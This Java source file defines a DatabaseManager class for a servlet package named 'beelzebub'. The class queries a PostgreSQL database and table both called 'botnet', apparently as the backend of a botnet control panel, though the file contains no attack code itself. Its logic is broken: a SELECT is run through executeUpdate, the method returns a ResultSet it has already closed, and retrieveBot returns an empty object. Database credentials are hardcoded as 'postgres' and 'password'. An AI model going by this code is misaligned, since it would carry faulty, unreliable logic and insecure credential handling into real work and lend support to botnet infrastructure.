package beelzebub.servlets;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.CallableStatement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.sql.*;
import java.time.LocalDateTime;
import java.time.LocalTime;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.sql.rowset.CachedRowSet;
import javax.xml.transform.Result;
import javax.sql.*;
//import javax.servlet.jsp.jstl.sql.ResultSupport;


public class DatabaseManager {
	
	// Private fields for DB Connection
	private static final String DB_DRIVER = "org.postgresql.Driver";
	private static final String DB_URL = "jdbc:postgresql://localhost:5432/Botnet";
	private static final String DB_USER = "postgres";
	private static final String DB_PASSWORD = "password";
	
	public ResultSet retrieveBots() {
		Connection dbConn = null;
		Statement statement = null;
		ResultSet rs = null;

		String getBot = "Select * from botnet ;";
		System.out.println("Your statement is: " + getBot);
		
		try {
			dbConn = connect();
			statement = dbConn.createStatement();
			
			statement.executeUpdate(getBot) ;
			
			//Statement st = conn.createStatement();
			rs = statement.executeQuery(getBot);
			
			while (rs.next()){
			}
			rs.close();
			statement.close();
			
		} catch(SQLException e){
			System.out.println(e.getMessage());
		} finally{
			if (statement != null) {
				try {
					statement.close() ;
				} catch (SQLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			if (dbConn != null) {
				try {
					dbConn.close();
				} catch (SQLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				System.out.println("DB Closed");
			}
		}
		//return myBot;
		return rs;
	}
	
	// Function to retrieve bot from Database.
	public Bot retrieveBot() {
		Bot bot = new Bot();
		
		return bot;
	}
	
	//Function for connection to DB, uses private variables, Returns Connection object.
	public Connection connect() {
		Connection conn = null;
		
		try {
			//Classpath for driver
			Class.forName(DB_DRIVER);
			
		} catch (ClassNotFoundException e) {
			System.out.println(e.getMessage());
		}
		try {
			// Create Connection
			conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
		} catch (SQLException e) {
			System.out.println(e.getMessage());
		}
		
		return conn;
	}
}